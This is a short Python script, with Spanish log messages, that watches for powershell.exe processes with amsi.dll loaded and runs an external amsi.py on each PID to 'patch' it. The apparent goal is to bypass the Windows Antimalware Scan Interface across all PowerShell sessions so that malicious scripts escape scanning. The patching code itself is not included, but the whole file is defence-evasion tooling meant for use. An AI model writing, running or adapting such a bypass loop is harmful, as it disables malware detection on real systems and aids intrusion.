import psutil
import subprocess
import time
import os

CHECK_INTERVAL = 5  

patched_processes = set()

def is_amsi_loaded(proc):
    try:
        for dll in proc.memory_maps():
            if 'amsi.dll' in dll.path.lower():
                return True
    except (psutil.AccessDenied, psutil.NoSuchProcess):
        pass
    return False

def main():
    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == "powershell.exe":
                pid = proc.info['pid']
                
                if is_amsi_loaded(proc) and pid not in patched_processes:
                    print(f"amsi.dll está cargado en el proceso {pid}. Aplicando parche...")
                    subprocess.run(['python', 'amsi.py', str(pid)]) 
                    patched_processes.add(pid)
                elif pid in patched_processes:
                    print(f"El proceso {pid} ya ha sido parcheado.")

        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
